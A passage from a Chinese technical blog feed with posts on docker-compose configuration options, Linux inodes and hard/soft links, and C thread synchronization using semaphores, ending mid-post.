定义容器重启策略(接受三个参数)</span><br>                    none                  <span class="hljs-comment"># 不尝试重启</span><br>                    on-failure            <span class="hljs-comment"># 只有当容器内部应用程序出现问题才会重启</span><br>                    any                   <span class="hljs-comment"># 无论如何都会尝试重启(默认)</span><br>                delay                 <span class="hljs-comment"># 尝试重启的间隔时间(默认为 0s)</span><br>                max_attempts          <span class="hljs-comment"># 尝试重启次数(默认一直尝试重启)</span><br>                window                <span class="hljs-comment"># 检查重启是否成功之前的等待时间(即如果容器启动了, 隔多少秒之后去检测容器是否正常, 默认 0s)</span><br>            update_config         <span class="hljs-comment"># 用于配置滚动更新配置</span><br>                parallelism           <span class="hljs-comment"># 一次性更新的容器数量</span><br>                delay                 <span class="hljs-comment"># 更新一组容器之间的间隔时间</span><br>                failure_action        <span class="hljs-comment"># 定义更新失败的策略</span><br>                    <span class="hljs-built_in">continue</span>              <span class="hljs-comment"># 继续更新</span><br>                    rollback              <span class="hljs-comment"># 回滚更新</span><br>                    pause                 <span class="hljs-comment"># 暂停更新(默认)</span><br>                monitor               <span class="hljs-comment"># 每次更新后的持续时间以监视更新是否失败(单位: ns|us|ms|s|m|h) (默认为0)</span><br>                max_failure_ratio     <span class="hljs-comment"># 回滚期间容忍的失败率(默认值为0)</span><br>                order                 <span class="hljs-comment"># v3.4 版本中新增的参数, 回滚期间的操作顺序</span><br>                    stop-first            <span class="hljs-comment">#旧任务在启动新任务之前停止(默认)</span><br>                    start-first           <span class="hljs-comment">#首先启动新任务, 并且正在运行的任务暂时重叠</span><br>            rollback_config       <span class="hljs-comment"># v3.7 版本中新增的参数, 用于定义在 update_config 更新失败的回滚策略</span><br>                parallelism           <span class="hljs-comment"># 一次回滚的容器数, 如果设置为0, 则所有容器同时回滚</span><br>                delay                 <span class="hljs-comment"># 每个组回滚之间的时间间隔(默认为0)</span><br>                failure_action        <span class="hljs-comment"># 定义回滚失败的策略</span><br>                    <span class="hljs-built_in">continue</span>              <span class="hljs-comment"># 继续回滚</span><br>                    pause                 <span class="hljs-comment"># 暂停回滚</span><br>                monitor               <span class="hljs-comment"># 每次回滚任务后的持续时间以监视失败(单位: ns|us|ms|s|m|h) (默认为0)</span><br>                max_failure_ratio     <span class="hljs-comment"># 回滚期间容忍的失败率(默认值0)</span><br>                order                 <span class="hljs-comment"># 回滚期间的操作顺序</span><br>                    stop-first            <span class="hljs-comment"># 旧任务在启动新任务之前停止(默认)</span><br>                    start-first           <span class="hljs-comment"># 首先启动新任务, 并且正在运行的任务暂时重叠</span><br><br>            注意：<br>                支持 docker-compose up 和 docker-compose run 但不支持 docker stack deploy 的子选项<br>                security_opt  container_name  devices  tmpfs  stop_signal  links    cgroup_parent<br>                network_mode  external_links  restart  build  userns_mode  sysctls<br><br>        devices               <span class="hljs-comment"># 指定设备映射列表 (等同于 docker run --device 的作用)</span><br><br>        depends_on            <span class="hljs-comment"># 定义容器启动顺序 (此选项解决了容器之间的依赖关系， 此选项在 v3 版本中 使用 swarm 部署时将忽略该选项)</span><br>            示例：<br>                docker-compose up 以依赖顺序启动服务，下面例子中 redis 和 db 服务在 web 启动前启动<br>                默认情况下使用 docker-compose up web 这样的方式启动 web 服务时，也会启动 redis 和 db 两个服务，因为在配置文件中定义了依赖关系<br>                version: <span class="hljs-string">&#x27;3&#x27;</span><br>                services:<br>                    web:<br>                        build: .<br>                        depends_on:<br>                            - db      <br>                            - redis  <br>                    redis:<br>                        image: redis<br>                    db:<br>                        image: postgres                             <br><br>        dns                   <span class="hljs-comment"># 设置 DNS 地址(等同于 docker run --dns 的作用)</span><br><br>        dns_search            <span class="hljs-comment"># 设置 DNS 搜索域(等同于 docker run --dns-search 的作用)</span><br><br>        tmpfs                 <span class="hljs-comment"># v2 版本以上, 挂载目录到容器中, 作为容器的临时文件系统(等同于 docker run --tmpfs 的作用, 在使用 swarm 部署时将忽略该选项)</span><br><br>        entrypoint            <span class="hljs-comment"># 覆盖容器的默认 entrypoint 指令 (等同于 docker run --entrypoint 的作用)</span><br><br>        env_file              <span class="hljs-comment"># 从指定文件中读取变量设置为容器中的环境变量, 可以是单个值或者一个文件列表, 如果多个文件中的变量重名则后面的变量覆盖前面的变量, environment 的值覆盖 env_file 的值</span><br>            文件格式：<br>                RACK_ENV=development <br><br>        environment           <span class="hljs-comment"># 设置环境变量， environment 的值可以覆盖 env_file 的值 (等同于 docker run --env 的作用)</span><br><br>        expose                <span class="hljs-comment"># 暴露端口, 但是不能和宿主机建立映射关系, 类似于 Dockerfile 的 EXPOSE 指令</span><br><br>        external_links        <span class="hljs-comment"># 连接不在 docker-compose.yml 中定义的容器或者不在 compose 管理的容器(docker run 启动的容器, 在 v3 版本中使用 swarm 部署时将忽略该选项)</span><br><br>        extra_hosts           <span class="hljs-comment"># 添加 host 记录到容器中的 /etc/hosts 中 (等同于 docker run --add-host 的作用)</span><br><br>        healthcheck           <span class="hljs-comment"># v2.1 以上版本, 定义容器健康状态检查, 类似于 Dockerfile 的 HEALTHCHECK 指令</span><br>            <span class="hljs-built_in">test</span>                  <span class="hljs-comment"># 检查容器检查状态的命令, 该选项必须是一个字符串或者列表, 第一项必须是 NONE, CMD 或 CMD-SHELL, 如果其是一个字符串则相当于 CMD-SHELL 加该字符串</span><br>                NONE                  <span class="hljs-comment"># 禁用容器的健康状态检测</span><br>                CMD                   <span class="hljs-comment"># test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost&quot;]</span><br>                CMD-SHELL             <span class="hljs-comment"># test: [&quot;CMD-SHELL&quot;, &quot;curl -f http://localhost || exit 1&quot;] 或者　test: curl -f https://localhost || exit 1</span><br>            interval: 1m30s       <span class="hljs-comment"># 每次检查之间的间隔时间</span><br>            <span class="hljs-built_in">timeout</span>: 10s          <span class="hljs-comment"># 运行命令的超时时间</span><br>            retries: 3            <span class="hljs-comment"># 重试次数</span><br>            start_period: 40s     <span class="hljs-comment"># v3.4 以上新增的选项, 定义容器启动时间间隔</span><br>            <span class="hljs-built_in">disable</span>: <span class="hljs-literal">true</span>         <span class="hljs-comment"># true 或 false, 表示是否禁用健康状态检测和　test: NONE 相同</span><br><br>        image                 <span class="hljs-comment"># 指定 docker 镜像, 可以是远程仓库镜像、本地镜像</span><br><br>        init                  <span class="hljs-comment"># v3.7 中新增的参数, true 或 false 表示是否在容器中运行一个 init, 它接收信号并传递给进程</span><br><br>        isolation             <span class="hljs-comment"># 隔离容器技术, 在 Linux 中仅支持 default 值</span><br><br>        labels                <span class="hljs-comment"># 使用 Docker 标签将元数据添加到容器, 与 Dockerfile 中的 LABELS 类似</span><br><br>        links                 <span class="hljs-comment"># 链接到其它服务中的容器, 该选项是 docker 历史遗留的选项, 目前已被用户自定义网络名称空间取代, 最终有可能被废弃 (在使用 swarm 部署时将忽略该选项)</span><br><br>        logging               <span class="hljs-comment"># 设置容器日志服务</span><br>            driver                <span class="hljs-comment"># 指定日志记录驱动程序, 默认 json-file (等同于 docker run --log-driver 的作用)</span><br>            options               <span class="hljs-comment"># 指定日志的相关参数 (等同于 docker run --log-opt 的作用)</span><br>                max-size              <span class="hljs-comment"># 设置单个日志文件的大小, 当到达这个值后会进行日志滚动操作</span><br>                max-file              <span class="hljs-comment"># 日志文件保留的数量</span><br><br>        network_mode          <span class="hljs-comment"># 指定网络模式 (等同于 docker run --net 的作用, 在使用 swarm 部署时将忽略该选项)         </span><br><br>        networks              <span class="hljs-comment"># 将容器加入指定网络 (等同于 docker network connect 的作用), networks 可以位于 compose 文件顶级键和 services 键的二级键</span><br>            aliases               <span class="hljs-comment"># 同一网络上的容器可以使用服务名称或别名连接到其中一个服务的容器</span><br>            ipv4_address      <span class="hljs-comment"># IP V4 格式</span><br>            ipv6_address      <span class="hljs-comment"># IP V6 格式</span><br><br>            示例:<br>                version: <span class="hljs-string">&#x27;3.7&#x27;</span><br>                services: <br>                    <span class="hljs-built_in">test</span>: <br>                        image: nginx:1.14-alpine<br>                        container_name: mynginx<br>                        <span class="hljs-built_in">command</span>: ifconfig<br>                        networks: <br>                            app_net:                                <span class="hljs-comment"># 调用下面 networks 定义的 app_net 网络</span><br>                            ipv4_address: 172.16.238.10<br>                networks:<br>                    app_net:<br>                        driver: bridge<br>                        ipam:<br>                            driver: default<br>                            config:<br>                                - subnet: 172.16.238.0/24<br><br>        pid: <span class="hljs-string">&#x27;host&#x27;</span>           <span class="hljs-comment"># 共享宿主机的 进程空间(PID)</span><br><br>        ports                 <span class="hljs-comment"># 建立宿主机和容器之间的端口映射关系, ports 支持两种语法格式</span><br>            SHORT 语法格式示例:<br>                - <span class="hljs-string">&quot;3000&quot;</span>                            <span class="hljs-comment"># 暴露容器的 3000 端口, 宿主机的端口由 docker 随机映射一个没有被占用的端口</span><br>                - <span class="hljs-string">&quot;3000-3005&quot;</span>                       <span class="hljs-comment"># 暴露容器的 3000 到 3005 端口, 宿主机的端口由 docker 随机映射没有被占用的端口</span><br>                - <span class="hljs-string">&quot;8000:8000&quot;</span>                       <span class="hljs-comment"># 容器的 8000 端口和宿主机的 8000 端口建立映射关系</span><br>                - <span class="hljs-string">&quot;9090-9091:8080-8081&quot;</span><br>                - <span class="hljs-string">&quot;127.0.0.1:8001:8001&quot;</span>             <span class="hljs-comment"># 指定映射宿主机的指定地址的</span><br>                - <span class="hljs-string">&quot;127.0.0.1:5000-5010:5000-5010&quot;</span>   <br>                - <span class="hljs-string">&quot;6060:6060/udp&quot;</span>                   <span class="hljs-comment"># 指定协议</span><br><br>            LONG 语法格式示例:(v3.2 新增的语法格式)<br>                ports:<br>                    - target: 80                    <span class="hljs-comment"># 容器端口</span><br>                      published: 8080               <span class="hljs-comment"># 宿主机端口</span><br>                      protocol: tcp                 <span class="hljs-comment"># 协议类型</span><br>                      mode: host                    <span class="hljs-comment"># host 在每个节点上发布主机端口,  ingress 对于群模式端口进行负载均衡</span><br><br>        secrets               <span class="hljs-comment"># 不知道怎么用</span><br><br>        security_opt          <span class="hljs-comment"># 为每个容器覆盖默认的标签 (在使用 swarm 部署时将忽略该选项)</span><br><br>        stop_grace_period     <span class="hljs-comment"># 指定在发送了 SIGTERM 信号之后, 容器等待多少秒之后退出(默认 10s)</span><br><br>        stop_signal           <span class="hljs-comment"># 指定停止容器发送的信号 (默认为 SIGTERM 相当于 kill PID; SIGKILL 相当于 kill -9 PID; 在使用 swarm 部署时将忽略该选项)</span><br><br>        sysctls               <span class="hljs-comment"># 设置容器中的内核参数 (在使用 swarm 部署时将忽略该选项)</span><br><br>        ulimits               <span class="hljs-comment"># 设置容器的 limit</span><br><br>        userns_mode           <span class="hljs-comment"># 如果Docker守护程序配置了用户名称空间, 则禁用此服务的用户名称空间 (在使用 swarm 部署时将忽略该选项)</span><br><br>        volumes               <span class="hljs-comment"># 定义容器和宿主机的卷映射关系, 其和 networks 一样可以位于 services 键的二级键和 compose 顶级键, 如果需要跨服务间使用则在顶级键定义, 在 services 中引用</span><br>            SHORT 语法格式示例:<br>                volumes:<br>                    - /var/lib/mysql                <span class="hljs-comment"># 映射容器内的 /var/lib/mysql 到宿主机的一个随机目录中</span><br>                    - /opt/data:/var/lib/mysql      <span class="hljs-comment"># 映射容器内的 /var/lib/mysql 到宿主机的 /opt/data</span><br>                    - ./cache:/tmp/cache            <span class="hljs-comment"># 映射容器内的 /var/lib/mysql 到宿主机 compose 文件所在的位置</span><br>                    - ~/configs:/etc/configs/:ro    <span class="hljs-comment"># 映射容器宿主机的目录到容器中去, 权限只读</span><br>                    - datavolume:/var/lib/mysql     <span class="hljs-comment"># datavolume 为 volumes 顶级键定义的目录, 在此处直接调用</span><br><br>            LONG 语法格式示例:(v3.2 新增的语法格式)<br>                version: <span class="hljs-string">&quot;3.2&quot;</span><br>                services:<br>                    web:<br>                        image: nginx:alpine<br>                        ports:<br>                            - <span class="hljs-string">&quot;80:80&quot;</span><br>                        volumes:<br>                            - <span class="hljs-built_in">type</span>: volume                  <span class="hljs-comment"># mount 的类型, 必须是 bind、volume 或 tmpfs</span><br>                                <span class="hljs-built_in">source</span>: mydata              <span class="hljs-comment"># 宿主机目录</span><br>                                target: /data               <span class="hljs-comment"># 容器目录</span><br>                                volume:                     <span class="hljs-comment"># 配置额外的选项, 其 key 必须和 type 的值相同</span><br>                                    nocopy: <span class="hljs-literal">true</span>                <span class="hljs-comment"># volume 额外的选项, 在创建卷时禁用从容器复制数据</span><br>                            - <span class="hljs-built_in">type</span>: <span class="hljs-built_in">bind</span>                    <span class="hljs-comment"># volume 模式只指定容器路径即可, 宿主机路径随机生成; bind 需要指定容器和数据机的映射路径</span><br>                                <span class="hljs-built_in">source</span>: ./static<br>                                target: /opt/app/static<br>                                read_only: <span class="hljs-literal">true</span>             <span class="hljs-comment"># 设置文件系统为只读文件系统</span><br>                volumes:<br>                    mydata:                                 <span class="hljs-comment"># 定义在 volume, 可在所有服务中调用</span><br><br>        restart               <span class="hljs-comment"># 定义容器重启策略(在使用 swarm 部署时将忽略该选项, 在 swarm 使用 restart_policy 代替 restart)</span><br>            no                    <span class="hljs-comment"># 禁止自动重启容器(默认)</span><br>            always                <span class="hljs-comment"># 无论如何容器都会重启</span><br>            on-failure            <span class="hljs-comment"># 当出现 on-failure 报错时, 容器重新启动</span><br><br>        其他选项：<br>            domainname, hostname, ipc, mac_address, privileged, read_only, shm_size, stdin_open, <span class="hljs-built_in">tty</span>, user, working_dir<br>            上面这些选项都只接受单个值和 docker run 的对应参数类似<br><br>        对于值为时间的可接受的值：<br>            2.5s<br>            10s<br>            1m30s<br>            2h32m<br>            5h34m56s<br>            时间单位: us, ms, s, m， h<br>        对于值为大小的可接受的值：<br>            2b<br>            1024kb<br>            2048k<br>            300m<br>            1gb<br>            单位: b, k, m, g 或者 kb, mb, gb<br>    networks          <span class="hljs-comment"># 定义 networks 信息</span><br>        driver                <span class="hljs-comment"># 指定网络模式, 大多数情况下, 它 bridge 于单个主机和 overlay Swarm 上</span><br>            bridge                <span class="hljs-comment"># Docker 默认使用 bridge 连接单个主机上的网络</span><br>            overlay               <span class="hljs-comment"># overlay 驱动程序创建一个跨多个节点命名的网络</span><br>            host                  <span class="hljs-comment"># 共享主机网络名称空间(等同于 docker run --net=host)</span><br>            none                  <span class="hljs-comment"># 等同于 docker run --net=none</span><br>        driver_opts           <span class="hljs-comment"># v3.2以上版本, 传递给驱动程序的参数, 这些参数取决于驱动程序</span><br>        attachable            <span class="hljs-comment"># driver 为 overlay 时使用, 如果设置为 true 则除了服务之外，独立容器也可以附加到该网络; 如果独立容器连接到该网络，则它可以与其他 Docker 守护进程连接到的该网络的服务和独立容器进行通信</span><br>        ipam                  <span class="hljs-comment"># 自定义 IPAM 配置. 这是一个具有多个属性的对象, 每个属性都是可选的</span><br>            driver                <span class="hljs-comment"># IPAM 驱动程序, bridge 或者 default</span><br>            config                <span class="hljs-comment"># 配置项</span><br>                subnet                <span class="hljs-comment"># CIDR格式的子网，表示该网络的网段</span><br>        external              <span class="hljs-comment"># 外部网络, 如果设置为 true 则 docker-compose up 不会尝试创建它, 如果它不存在则引发错误</span><br>        name                  <span class="hljs-comment"># v3.5 以上版本, 为此网络设置名称</span><br>文件格式示例：<br>    version: <span class="hljs-string">&quot;3&quot;</span><br>    services:<br>      redis:<br>        image: redis:alpine<br>        ports:<br>          - <span class="hljs-string">&quot;6379&quot;</span><br>        networks:<br>          - frontend<br>        deploy:<br>          replicas: 2<br>          update_config:<br>            parallelism: 2<br>            delay: 10s<br>          restart_policy:<br>            condition: on-failure<br>      db:<br>        image: postgres:9.4<br>        volumes:<br>          - db-data:/var/lib/postgresql/data<br>        networks:<br>          - backend<br>        deploy:<br>          placement:<br>            constraints: [node.role == manager]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>硬链接和软链接</title>
    <link href="/2022/04/17/%E7%A1%AC%E9%93%BE%E6%8E%A5%E5%92%8C%E8%BD%AF%E9%93%BE%E6%8E%A5/"/>
    <url>/2022/04/17/%E7%A1%AC%E9%93%BE%E6%8E%A5%E5%92%8C%E8%BD%AF%E9%93%BE%E6%8E%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="硬链接和软链接"><a href="#硬链接和软链接" class="headerlink" title="硬链接和软链接"></a>硬链接和软链接</h1><h3 id="1-inode的概念"><a href="#1-inode的概念" class="headerlink" title="1.inode的概念"></a>1.inode的概念</h3><p>文件存储在磁盘上,磁盘在格式化文件系统后,分为两个部分,一个是inode存储区,一个是数据存储区,每个inode存储了这个文件的详细信息,这些信息一般有:</p><ul><li><p>1.文件的所属者</p></li><li><p>2.文件的所属组</p></li><li><p>3.文件的权限</p></li><li><p>4.文件的创建时间</p></li><li><p>5.文件最近修改的时间</p></li><li><p>6.文件的最近访问时间</p></li><li><p>7.链接数,(有多少个链接指向这个文件)</p></li><li><p>8.文件的大小</p></li></ul><p>用户可以使用stat命令查看这些信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">stat</span> filename<br></code></pre></td></tr></table></figure><p>在linux平台上,</p><p>linux并不使用文件名识别文件,而使用inode识别文件,因此linux下每个文件名都指向了一个inode,在用户访问文件时,linux内部首先会获取要访问文件的inode号码,从inode里面获取真正的数据存储区。获取文件数据,在删除文件的时候,文件的links减1,当links减到0时,inode会被删除  </p><p>用户可以使用stat命令查看这些信息</p><h3 id="2-硬链接"><a href="#2-硬链接" class="headerlink" title="2.硬链接"></a>2.硬链接</h3><p>硬链接和源文件拥有相同的inode,<br>linux使用ln 源文件名 目标文件名创建硬链接,</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> /path/to/sourcefile /path/to/destnaionfile<br></code></pre></td></tr></table></figure><h3 id="3-软链接"><a href="#3-软链接" class="headerlink" title="3.软链接"></a>3.软链接</h3><p>​软连接是一个存在的文件,但是文件里面存储的内容是目标文件的路径</p>]]></content>
    
    
    <categories>
      
      <category>计算机基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>线程同步</title>
    <link href="/2022/04/17/%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5/"/>
    <url>/2022/04/17/%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h1><h3 id="1-使用信号量实现线程同步"><a href="#1-使用信号量实现线程同步" class="headerlink" title="1.使用信号量实现线程同步"></a>1.使用信号量实现线程同步</h3><h3 id="使用的api"><a href="#使用的api" class="headerlink" title="使用的api"></a>使用的api</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sem_init</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *sem,<span class="hljs-type">int</span> shared,<span class="hljs-type">int</span> value)</span>;<span class="hljs-comment">//初始化无名信号灯</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sem_wait</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *sem)</span>;<span class="hljs-comment">//p操作,如果信号量大于0,则信号量-1,函数立即返回,否则函数进入阻塞状态直到信号量大于0</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sem_post</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *sem)</span>;<span class="hljs-comment">//v操作,如果信号量等于0,则信号量+1,函数立即返回,否则函数进入阻塞状态,直到信号量等于0</span><br></code></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fifo <span class="hljs-string">&quot;/tmp/myfifo&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> string <span class="hljs-string">&quot;myhelloworld&quot;</span></span><br><br><span class="hljs-type">int</span> fd = <span class="hljs-number">0</span>;<br><span class="hljs-type">sem_t</span> full, avail, mutex;<span class="hljs-comment">//初始化三个全局信号量</span><br><span class="hljs-comment">//生产者线程函数</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">producer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br>    sem_wait(&amp;avail);<br>    sem_wait(&amp;mutex);<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> stringlen = <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">string</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//action</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; <span class="hljs-number">5</span>) &#123;<br>        ret = write(fd, <span class="hljs-built_in">string</span>, stringlen);<br>        <span class="hljs-keyword">if</span> (ret != stringlen) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;write string to fifo file error!\n&quot;</span>);<br>            pthread_exit(<span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nwrite string to fifo file successful!\n&quot;</span>);<br>        sem_post(&amp;full);<br>        sem_post(&amp;mutex);<br>        sleep(<span class="hljs-number">1</span>);<br>        i++;<br>    &#125;<br>    pthread_exit(<span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-comment">//消费则线程函数</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">consumer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br>    sem_wait(&amp;full);<br>    sem_wait(&amp;mutex);<br>    <span class="hljs-comment">//action</span><br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> stringlen = <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">string</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-type">char</span> buffer[stringlen];<br>    bzero(buffer, stringlen);<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; <span class="hljs-number">5</span>) &#123;<br>        ret = read(fd, buffer, stringlen);<br>        <span class="hljs-keyword">if</span> (ret != stringlen) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read string from fifo file error!\n&quot;</span>);<br>            pthread_exit(<span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read string from fifo:%s\n&quot;</span>, buffer);<br>        bzero(buffer, stringlen);<br>        i++;<br>        sleep(<span class="hljs-number">1</span>);<br>        sem_post(&amp;avail);<br>        sem_post(&amp;mutex);<br>    &#125;<br><br>    pthread_exit(<span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-keyword">if</span> (F_OK == access(fifo, <span class="hljs-number">0</span>)) &#123;<br>        unlink(fifo);<br>    &#125;<br>    ret = mkfifo(fifo, <span class="hljs-number">0666</span>);<br>    fd = open(fifo, O_RDWR);<br>    <span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;mkfifo&quot;</span>);<br>    &#125;<br>    ret = sem_init(&amp;full, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) + sem_init(&amp;avail, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) + sem_init(&amp;mutex, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;semphore init failed!\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-type">pthread_t</span> threadid[<span class="hljs-number">2</span>];<br>    <span class="hljs-comment">//创建两个线程</span><br>    <span class="hljs-keyword">if</span> (pthread_create(&amp;threadid[<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>, producer, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;create thread failed!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (pthread_create(&amp;threadid[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, consumer, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;create thread failed!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">//等待两个线程结束</span><br>    pthread_join(threadid[<span class="hljs-number">0</span>], <span class="hljs-literal">NULL</span>);<br>    pthread_join(threadid[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-使用线程互斥锁实现线程同步"><a href="#2-使用线程互斥锁实现线程同步" class="headerlink" title="2.使用线程互斥锁实现线程同步"></a>2.使用线程互斥锁实现线程同步</h3><h4 id="使用的api-1"><a href="#使用的api-1" class="headerlink" title="使用的api"></a>使用的api</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pthread_mutex_t</span> 线程互斥锁类型<br>pthread_mutex_lock(<span class="hljs-type">pthread_mutex_t</span> *mutex);<br>pthread_mutex_unlock(<span class="hljs-type">pthread_mutex_t</span> 